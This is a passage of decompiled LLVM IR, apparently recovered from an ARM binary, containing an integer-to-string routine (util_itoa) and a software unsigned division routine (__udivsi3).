dec_label_pc_10b74:                               ; preds = %dec_label_pc_10b68
  %v2_10b74 = sub i32 %v5_10b3c, %tmp23
  br label %dec_label_pc_10b80

dec_label_pc_10b80:                               ; preds = %dec_label_pc_10b30.backedge, %dec_label_pc_10b28, %dec_label_pc_10b74
  %storemerge = phi i32 [ %v2_10b74, %dec_label_pc_10b74 ], [ -1, %dec_label_pc_10b28 ], [ -1, %dec_label_pc_10b30.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10b68, { 1, 0 }
  uselistorder i32 %v0_10b3c, { 1, 0 }
  uselistorder i32 %v1_10b48, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 5, 2, 3, 4 }
  uselistorder label %dec_label_pc_10b80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10b30.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_10b3c, { 1, 0 }
}

define i32 @util_itoa(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v0_10b8c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10b8c, i32* %r8.global-to-local, align 4
  %v2_10b8c = icmp eq i32 %v0_10b8c, 0
  store i1 %v2_10b8c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_10b8c, label %dec_label_pc_10c6c, label %dec_label_pc_10b9c

dec_label_pc_10b9c:                               ; preds = %entry
  %v3_10b9c = icmp eq i8 %arg1, 0
  store i1 %v3_10b9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10b9c, label %.thread, label %dec_label_pc_10bb0

.thread:                                          ; preds = %dec_label_pc_10b9c
  %v4_10ba4 = inttoptr i32 %v0_10b8c to i8*
  store i8 48, i8* %v4_10ba4, align 1
  %v0_10ba8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10ba8.pr.pr, label %.thread1, label %dec_label_pc_10bb0

.thread1:                                         ; preds = %.thread
  %v4_10ba8 = load i32, i32* %r8.global-to-local, align 4
  %v5_10ba8 = add i32 %v4_10ba8, 1
  %v6_10ba8 = inttoptr i32 %v5_10ba8 to i8*
  store i8 0, i8* %v6_10ba8, align 1
  %v0_10bac.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10bac.pr.pr, label %dec_label_pc_10c6c, label %dec_label_pc_10bb0

dec_label_pc_10bb0:                               ; preds = %dec_label_pc_10b9c, %.thread, %.thread1
  %tmp48 = icmp slt i8 %arg1, 0
  %v7_10bb4 = icmp eq i32 %arg2, 10
  store i1 %v7_10bb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10bb4, label %bb, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_10bb0
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_10bb0
  %v4_10bb0 = zext i1 %tmp48 to i32
  store i32 %v4_10bb0, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp48, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_10bd48 = sub nsw i32 0, %tmp
  %tmp.v3_10bd48 = select i1 %phitmp, i32 %tmp, i32 %v3_10bd48
  %tmp47 = zext i1 %phitmp to i32
  %. = xor i32 %tmp47, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread29
  %storemerge31 = phi i32 [ %tmp, %.thread29 ], [ %tmp.v3_10bd48, %bb ]
  %storemerge = phi i32 [ 0, %.thread29 ], [ %., %bb ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_10be0 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_10be0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10be4

dec_label_pc_10be4:                               ; preds = %bb46, %.thread6
  %v2_10c04 = phi i32 [ %v1_10c10, %bb46 ], [ 32, %.thread6 ]
  %v0_10bf8 = phi i32 [ %v2_10c08, %bb46 ], [ %storemerge31, %.thread6 ]
  %v0_10be8 = load i32, i32* %r6.global-to-local, align 4
  %v3_10bec = urem i32 %v0_10bf8, %v0_10be8
  store i32 %v3_10bec, i32* %r1.global-to-local, align 4
  %v7_10bf0 = icmp eq i32 %v3_10bec, 9
  store i1 %v7_10bf0, i1* %cpsr_z.global-to-local, align 1
  %v1_10bf4 = add i32 %v3_10bec, 48
  store i32 %v0_10bf8, i32* %r0.global-to-local, align 4
  %v7_10bfc = icmp sgt i32 %v3_10bec, 9
  %extract.t = trunc i32 %v1_10bf4 to i8
  br i1 %v7_10bfc, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_10be4
  %v9_10bfc = add i32 %v3_10bec, 55
  %extract.t28 = trunc i32 %v9_10bfc to i8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_10be4, %bb45
  %v0_10c04.off0 = phi i8 [ %extract.t, %dec_label_pc_10be4 ], [ %extract.t28, %bb45 ]
  store i32 %v0_10be8, i32* %r1.global-to-local, align 4
  %v3_10c04 = load i32, i32* %r7.global-to-local, align 4
  %v4_10c04 = add i32 %v3_10c04, %v2_10c04
  %v5_10c04 = inttoptr i32 %v4_10c04 to i8*
  store i8 %v0_10c04.off0, i8* %v5_10c04, align 1
  %v0_10c08 = load i32, i32* %r0.global-to-local, align 4
  %v1_10c08 = load i32, i32* %r1.global-to-local, align 4
  %v2_10c08 = udiv i32 %v0_10c08, %v1_10c08
  store i32 %v2_10c08, i32* %r0.global-to-local, align 4
  %v2_10c0c = icmp ugt i32 %v1_10c08, %v0_10c08
  store i1 %v2_10c0c, i1* %cpsr_z.global-to-local, align 1
  %v0_10c10 = load i32, i32* %r5.global-to-local, align 4
  %v1_10c10 = add i32 %v0_10c10, -1
  store i32 %v1_10c10, i32* %r5.global-to-local, align 4
  br i1 %v2_10c0c, label %dec_label_pc_10c18, label %dec_label_pc_10be4

dec_label_pc_10c18:                               ; preds = %bb46
  %v0_10c18 = load i32, i32* %sl.global-to-local, align 4
  %v2_10c18 = icmp eq i32 %v0_10c18, 0
  store i1 %v2_10c18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10c18, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_10c18
  %v3_10c1c = ptrtoint i32* %stack_var_-32 to i32
  %v3_10c20 = add i32 %v1_10c10, %v3_10c1c
  store i32 %v3_10c20, i32* %r2.global-to-local, align 4
  %v4_10c28 = add i32 %v3_10c20, -34
  %v5_10c28 = inttoptr i32 %v4_10c28 to i8*
  store i8 45, i8* %v5_10c28, align 1
  %v0_10c2c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10c2c.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_10c2c.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_10c18
  %v1_10c2c = phi i32 [ %v1_10c10, %dec_label_pc_10c18 ], [ %v1_10c2c.pre, %.thread11 ]
  %v2_10c2c = add i32 %v1_10c2c, 1
  store i32 %v2_10c2c, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_10c38 = phi i32 [ %v2_10c2c, %.thread12 ], [ %v1_10c2c.pre, %.thread11 ]
  %v0_10c30 = load i32, i32* %r7.global-to-local, align 4
  %v2_10c30 = add i32 %v0_10c30, %v1_10c38
  %v3_10c30 = inttoptr i32 %v2_10c30 to i8*
  %v4_10c30 = load i8, i8* %v3_10c30, align 1
  %v6_10c30 = zext i8 %v4_10c30 to i32
  %v2_10c34 = icmp eq i8 %v4_10c30, 0
  store i1 %v2_10c34, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_10c30, i32* %r2.global-to-local, align 4
  br i1 %v2_10c34, label %dec_label_pc_10c7c, label %dec_label_pc_10c44.preheader

dec_label_pc_10c44.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10c44

dec_label_pc_10c44:                               ; preds = %dec_label_pc_10c44.preheader, %dec_label_pc_10c44
  %v0_10c44 = phi i32 [ 0, %dec_label_pc_10c44.preheader ], [ %v1_10c44, %dec_label_pc_10c44 ]
  %v1_10c44 = add i32 %v0_10c44, 1
  store i32 %v1_10c44, i32* %r1.global-to-local, align 4
  %v2_10c48 = add i32 %v1_10c44, %v2_10c30
  %v3_10c48 = inttoptr i32 %v2_10c48 to i8*
  %v4_10c48 = load i8, i8* %v3_10c48, align 1
  %v2_10c4c = icmp eq i8 %v4_10c48, 0
  store i1 %v2_10c4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10c4c, label %dec_label_pc_10c54, label %dec_label_pc_10c44

dec_label_pc_10c54:                               ; preds = %dec_label_pc_10c44, %dec_label_pc_10c7c
  %v0_10c5825 = phi i32 [ %v6_10c30, %dec_label_pc_10c7c ], [ %v1_10c44, %dec_label_pc_10c44 ]
  %v0_10c54 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10c54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10c58

dec_label_pc_10c58:                               ; preds = %dec_label_pc_10c58.dec_label_pc_10c58_crit_edge, %dec_label_pc_10c54
  %v2_10c64 = phi i32 [ %v5_10c64, %dec_label_pc_10c58.dec_label_pc_10c58_crit_edge ], [ %v0_10c54, %dec_label_pc_10c54 ]
  %v0_10c5c = phi i32 [ %v0_10c5c.pre, %dec_label_pc_10c58.dec_label_pc_10c58_crit_edge ], [ %v2_10c30, %dec_label_pc_10c54 ]
  %v0_10c58 = phi i32 [ %v0_10c58.pre, %dec_label_pc_10c58.dec_label_pc_10c58_crit_edge ], [ %v0_10c5825, %dec_label_pc_10c54 ]
  %v1_10c58 = add i32 %v0_10c58, -1
  store i32 %v1_10c58, i32* %r1.global-to-local, align 4
  %v1_10c5c = inttoptr i32 %v0_10c5c to i8*
  %v2_10c5c = load i8, i8* %v1_10c5c, align 1
  %v5_10c5c = add i32 %v0_10c5c, 1
  store i32 %v5_10c5c, i32* %r2.global-to-local, align 4
  %v3_10c60 = icmp eq i32 %v0_10c58, 0
  store i1 %v3_10c60, i1* %cpsr_z.global-to-local, align 1
  %v3_10c64 = inttoptr i32 %v2_10c64 to i8*
  store i8 %v2_10c5c, i8* %v3_10c64, align 1
  %v4_10c64 = load i32, i32* %r0.global-to-local, align 4
  %v5_10c64 = add i32 %v4_10c64, 1
  store i32 %v5_10c64, i32* %r0.global-to-local, align 4
  br i1 %v3_10c60, label %dec_label_pc_10c6c, label %dec_label_pc_10c58.dec_label_pc_10c58_crit_edge

dec_label_pc_10c58.dec_label_pc_10c58_crit_edge:  ; preds = %dec_label_pc_10c58
  %v0_10c58.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_10c5c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10c58

dec_label_pc_10c6c:                               ; preds = %dec_label_pc_10c58, %.thread1, %entry
  %v0_10c6c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10c6c, i32* %r0.global-to-local, align 4
  ret i32 %v0_10c6c

dec_label_pc_10c7c:                               ; preds = %.thread11._crit_edge
  store i32 %v6_10c30, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10c54

; uselistorder directives
  uselistorder i32 %v5_10c64, { 1, 0 }
  uselistorder i1 %v3_10c60, { 1, 0 }
  uselistorder i32 %v0_10c5c, { 1, 0 }
  uselistorder i32 %v1_10c44, { 0, 1, 3, 2 }
  uselistorder i32 %v6_10c30, { 1, 0 }
  uselistorder i32 %v2_10c30, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10c2c.pre, { 1, 0 }
  uselistorder i32 %v1_10c10, { 1, 0, 3, 2 }
  uselistorder i32 %v2_10c08, { 1, 0 }
  uselistorder i32 %v3_10bec, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_10b8c, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 11, 10, 12, 13 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10c54, { 1, 0 }
  uselistorder label %dec_label_pc_10c44, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_10bb0, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_10c84 = load i32, i32* @r1, align 4
  %v1_10c84 = add i32 %v0_10c84, -1
  store i32 %v1_10c84, i32* %r2.global-to-local, align 4
  %v2_10c84 = icmp eq i32 %v0_10c84, 0
  %v7_10c84 = icmp eq i32 %v0_10c84, 1
  %v0_10c88 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_10c84, i32 %v0_10c88)
  br i1 %v2_10c84, label %dec_label_pc_10d6c, label %dec_label_pc_10c90

dec_label_pc_10c90:                               ; preds = %entry
  %v0_10c90 = load i32, i32* %r0.global-to-local, align 4
  %v1_10c90 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_10c90, %v1_10c90
  br i1 %tmp, label %dec_label_pc_10c98, label %dec_label_pc_10d24

dec_label_pc_10c98:                               ; preds = %dec_label_pc_10c90
  %v1_10c98 = load i32, i32* %r2.global-to-local, align 4
  %v2_10c98 = and i32 %v1_10c98, %v1_10c90
  %v4_10c98 = icmp eq i32 %v2_10c98, 0
  br i1 %v4_10c98, label %dec_label_pc_10d30, label %dec_label_pc_10ca0

dec_label_pc_10ca0:                               ; preds = %dec_label_pc_10c98
  %v3_10ca0 = icmp ult i32 %v1_10c90, 536870912
  br i1 %v3_10ca0, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_10ca0
  %v4_10ca4 = mul i32 %v1_10c90, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_10ca0, %.thread
  %v0_10cc4.pr36.ph = phi i32 [ %v4_10ca4, %.thread ], [ %v1_10c90, %dec_label_pc_10ca0 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_10ca0 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_10cc4.pr36 = phi i32 [ %v4_10cb8, %bb81 ], [ %v0_10cc4.pr36.ph, %.preheader.preheader ]
  %v1_10cbc = phi i32 [ %v4_10cbc, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_10cb0 = icmp ugt i32 %v0_10cc4.pr36, 268435455
  br i1 %v2_10cb0, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_10cc4thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_10cb4 = icmp ult i32 %v0_10cc4.pr36, %v0_10c90
  br i1 %v4_10cb4, label %bb80, label %dec_label_pc_10cc4thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_10cb8 = and i32 %v0_10cc4.pr36, 268435456
  %v3_10cb8 = icmp eq i32 %v2_10cb8, 0
  %v4_10cb8 = mul i32 %v0_10cc4.pr36, 16
  br i1 %v3_10cb8, label %bb81, label %dec_label_pc_10cc4.loopexit

bb81:                                             ; preds = %bb80
  %v2_10cbc = and i32 %v1_10cbc, 268435456
  %v3_10cbc = icmp eq i32 %v2_10cbc, 0
  %v4_10cbc = mul i32 %v1_10cbc, 16
  br i1 %v3_10cbc, label %.preheader, label %dec_label_pc_10cc4thread-pre-split.loopexit.loopexit

dec_label_pc_10cc4thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_10cd048.ph = phi i32 [ %v1_10cbc, %bb ], [ %v4_10cbc, %bb81 ]
  %v0_10cc4.pr38.ph = phi i32 [ %v0_10cc4.pr36, %bb ], [ %v4_10cb8, %bb81 ]
  br label %dec_label_pc_10cc4thread-pre-split.loopexit

dec_label_pc_10cc4thread-pre-split.loopexit:      ; preds = %dec_label_pc_10cc4thread-pre-split.loopexit.loopexit, %.thread2
  %v1_10cd048 = phi i32 [ %v1_10cbc, %.thread2 ], [ %v1_10cd048.ph, %dec_label_pc_10cc4thread-pre-split.loopexit.loopexit ]
  %v0_10cc4.pr38 = phi i32 [ %v0_10cc4.pr36, %.thread2 ], [ %v0_10cc4.pr38.ph, %dec_label_pc_10cc4thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_10cc4thread-pre-split

dec_label_pc_10cc4thread-pre-split:               ; preds = %dec_label_pc_10cc4thread-pre-split.loopexit, %bb83
  %v1_10cd046 = phi i32 [ %v1_10cd048, %dec_label_pc_10cc4thread-pre-split.loopexit ], [ %v3_10cd0, %bb83 ]
  %v0_10cc4.pr = phi i32 [ %v0_10cc4.pr38, %dec_label_pc_10cc4thread-pre-split.loopexit ], [ %v3_10ccc, %bb83 ]
  br label %dec_label_pc_10cc4

dec_label_pc_10cc4.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_10cc4

dec_label_pc_10cc4:                               ; preds = %dec_label_pc_10cc4.loopexit, %dec_label_pc_10cc4thread-pre-split
  %v1_10cd0 = phi i32 [ %v1_10cd046, %dec_label_pc_10cc4thread-pre-split ], [ %v1_10cbc, %dec_label_pc_10cc4.loopexit ]
  %v1_10ccc = phi i32 [ %v0_10cc4.pr, %dec_label_pc_10cc4thread-pre-split ], [ %v4_10cb8, %dec_label_pc_10cc4.loopexit ]
  %v2_10cc4 = icmp slt i32 %v1_10ccc, 0
  br i1 %v2_10cc4, label %dec_label_pc_10cd8, label %bb82

bb82:                                             ; preds = %dec_label_pc_10cc4
  %v4_10cc8 = icmp ult i32 %v1_10ccc, %v0_10c90
  br i1 %v4_10cc8, label %bb83, label %dec_label_pc_10cd8

bb83:                                             ; preds = %bb82
  %v3_10ccc = mul i32 %v1_10ccc, 2
  %v2_10cd0 = icmp slt i32 %v1_10cd0, 0
  %v3_10cd0 = mul i32 %v1_10cd0, 2
  br i1 %v2_10cd0, label %dec_label_pc_10cd8, label %dec_label_pc_10cc4thread-pre-split

dec_label_pc_10cd8:                               ; preds = %bb82, %dec_label_pc_10cc4, %bb83
  %v2_10ce459 = phi i32 [ %v3_10cd0, %bb83 ], [ %v1_10cd0, %bb82 ], [ %v1_10cd0, %dec_label_pc_10cc4 ]
  %v1_10cdc51 = phi i32 [ %v3_10ccc, %bb83 ], [ %v1_10ccc, %bb82 ], [ %v1_10ccc, %dec_label_pc_10cc4 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10cdc

dec_label_pc_10cdc:                               ; preds = %.thread11, %dec_label_pc_10cd8
  %v1_10d10 = phi i32 [ %v4_10d10, %.thread11 ], [ %v2_10ce459, %dec_label_pc_10cd8 ]
  %v1_10ce4 = phi i32 [ %v0_10d1c, %.thread11 ], [ 0, %dec_label_pc_10cd8 ]
  %v1_10d14 = phi i32 [ %v4_10d14, %.thread11 ], [ %v1_10cdc51, %dec_label_pc_10cd8 ]
  %v1_10ce0 = phi i32 [ %v0_10d0c, %.thread11 ], [ %v0_10c90, %dec_label_pc_10cd8 ]
  %v3_10cdc = icmp ult i32 %v1_10ce0, %v1_10d14
  br i1 %v3_10cdc, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_10cdc
  %v3_10ce0 = sub i32 %v1_10ce0, %v1_10d14
  store i32 %v3_10ce0, i32* %r0.global-to-local, align 4
  %v3_10ce4 = or i32 %v1_10ce4, %v1_10d10
  store i32 %v3_10ce4, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_10cdc, %bb84
  %v1_10cec = phi i32 [ %v1_10ce0, %dec_label_pc_10cdc ], [ %v3_10ce0, %bb84 ]
  %v1_10cf0 = phi i32 [ %v1_10ce4, %dec_label_pc_10cdc ], [ %v3_10ce4, %bb84 ]
  %v4_10ce8 = udiv i32 %v1_10d14, 2
  %v6_10ce8 = icmp ult i32 %v1_10cec, %v4_10ce8
  br i1 %v6_10ce8, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_10cec = urem i32 %v1_10d14, 2
  %v4_10cec = icmp eq i32 %v3_10cec, 0
  %v6_10cec = sub i32 %v1_10cec, %v4_10ce8
  store i32 %v6_10cec, i32* %r0.global-to-local, align 4
  br i1 %v4_10cec, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_10cf0 = udiv i32 %v1_10d10, 2
  %v6_10cf0 = or i32 %v1_10cf0, %v5_10cf0
  store i32 %v6_10cf0, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_10cf8 = phi i32 [ %v6_10cec, %bb85 ], [ %v1_10cec, %.thread7 ], [ %v6_10cec, %bb86 ]
  %v1_10cfc = phi i32 [ %v1_10cf0, %bb85 ], [ %v1_10cf0, %.thread7 ], [ %v6_10cf0, %bb86 ]
  %v4_10cf4 = udiv i32 %v1_10d14, 4
  %v6_10cf4 = icmp ult i32 %v1_10cf8, %v4_10cf4
  br i1 %v6_10cf4, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_10cf8 = and i32 %v1_10d14, 2
  %v4_10cf8 = icmp eq i32 %v3_10cf8, 0
  %v6_10cf8 = sub i32 %v1_10cf8, %v4_10cf4
  store i32 %v6_10cf8, i32* %r0.global-to-local, align 4
  br i1 %v4_10cf8, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_10cfc = udiv i32 %v1_10d10, 4
  %v6_10cfc = or i32 %v1_10cfc, %v5_10cfc
  store i32 %v6_10cfc, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_10d04 = phi i32 [ %v6_10cf8, %bb87 ], [ %v1_10cf8, %.thread8 ], [ %v6_10cf8, %bb88 ]
  %v1_10d08 = phi i32 [ %v1_10cfc, %bb87 ], [ %v1_10cfc, %.thread8 ], [ %v6_10cfc, %bb88 ]
  %v4_10d00 = udiv i32 %v1_10d14, 8
  %v6_10d00 = icmp ult i32 %v1_10d04, %v4_10d00
  br i1 %v6_10d00, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_10d04 = and i32 %v1_10d14, 4
  %v4_10d04 = icmp eq i32 %v3_10d04, 0
  %v6_10d04 = sub i32 %v1_10d04, %v4_10d00
  store i32 %v6_10d04, i32* %r0.global-to-local, align 4
  br i1 %v4_10d04, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_10d08 = udiv i32 %v1_10d10, 8
  %v6_10d08 = or i32 %v1_10d08, %v5_10d08
  store i32 %v6_10d08, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_10d1c = phi i32 [ %v1_10d08, %bb89 ], [ %v1_10d08, %.thread9 ], [ %v6_10d08, %bb90 ]
  %v0_10d0c = phi i32 [ %v6_10d04, %bb89 ], [ %v1_10d04, %.thread9 ], [ %v6_10d04, %bb90 ]
  %v2_10d0c = icmp eq i32 %v0_10d0c, 0
  br i1 %v2_10d0c, label %dec_label_pc_10d1c, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_10d10, 16
  br i1 %tmp138, label %dec_label_pc_10d1c, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_10d10 = udiv i32 %v1_10d10, 16
  %v4_10d14 = udiv i32 %v1_10d14, 16
  br label %dec_label_pc_10cdc

dec_label_pc_10d1c:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_10d1c, i32* %r0.global-to-local, align 4
  ret i32 %v0_10d1c

dec_label_pc_10d24:                               ; preds = %dec_label_pc_10c90
  %v9_10c90 = icmp eq i32 %v0_10c90, %v1_10c90
  %. = zext i1 %v9_10c90 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_10d30:                               ; preds = %dec_label_pc_10c98
  %v2_10d30 = icmp ugt i32 %v1_10c90, 65535
  br i1 %v2_10d30, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_10d30
  %v2_10d34 = and i32 %v1_10c90, 32768
  %v3_10d34 = icmp eq i32 %v2_10d34, 0
  %v4_10d34 = udiv i32 %v1_10c90, 65536
  br i1 %v3_10d34, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_10d30
  %v0_10d4065 = phi i32 [ %v1_10c90, %dec_label_pc_10d30 ], [ %v4_10d34, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_10d44 = phi i32 [ %v0_10d4065, %.thread16 ], [ %v4_10d34, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_10d40 = icmp ugt i32 %v1_10d44, 255
  br i1 %v2_10d40, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_10d44 = and i32 %v1_10d44, 128
  %v3_10d44 = icmp eq i32 %v2_10d44, 0
  %v4_10d44 = udiv i32 %v1_10d44, 256
  br i1 %v3_10d44, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_10d48 = or i32 %storemerge, 8
  store i32 %v2_10d48, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_10d54 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_10d48, %bb98 ]
  %v1_10d50 = phi i32 [ %v1_10d44, %bb96 ], [ %v4_10d44, %bb97 ], [ %v4_10d44, %bb98 ]
  %v2_10d4c = icmp ugt i32 %v1_10d50, 15
  br i1 %v2_10d4c, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_10d50 = and i32 %v1_10d50, 8
  %v3_10d50 = icmp eq i32 %v2_10d50, 0
  %v4_10d50 = udiv i32 %v1_10d50, 16
  br i1 %v3_10d50, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_10d54 = add nsw i32 %v1_10d54, 4
  store i32 %v2_10d54, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_10d5c = phi i32 [ %v1_10d54, %.thread17 ], [ %v1_10d54, %bb99 ], [ %v2_10d54, %bb100 ]
  %v5_10d60 = phi i32 [ %v1_10d50, %.thread17 ], [ %v4_10d50, %bb99 ], [ %v4_10d50, %bb100 ]
  %v2_10d58 = icmp ugt i32 %v5_10d60, 3
  %v7_10d58 = icmp eq i32 %v5_10d60, 4
  %v2_10d5c = xor i1 %v7_10d58, true
  %v3_10d5c = and i1 %v2_10d58, %v2_10d5c
  br i1 %v3_10d5c, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_10d5c = add nsw i32 %v4_10d5c, 3
  store i32 %v5_10d5c, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_10d60 = phi i32 [ %v4_10d5c, %.thread18 ], [ %v5_10d5c, %bb101 ]
  %v2_10d60 = xor i1 %v2_10d58, true
  %v3_10d60 = or i1 %v7_10d58, %v2_10d60
  br i1 %v3_10d60, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_10d60 = udiv i32 %v5_10d60, 2
  %v9_10d60 = add i32 %v4_10d60, %v8_10d60
  store i32 %v9_10d60, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_10d64 = phi i32 [ %v4_10d60, %bb102 ], [ %v9_10d60, %bb103 ]
  %v6_10d64 = lshr i32 %v0_10c90, %v1_10d64
  store i32 %v6_10d64, i32* %r0.global-to-local, align 4
  ret i32 %v6_10d64

dec_label_pc_10d6c:                               ; preds = %entry
  %v0_10d70 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_10d60, { 1, 0 }
  uselistorder i1 %v7_10d58, { 1, 0 }
  uselistorder i32 %v4_10d50, { 1, 0 }
  uselistorder i32 %v1_10d50, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10d48, { 1, 0 }
  uselistorder i32 %v4_10d44, { 1, 0 }
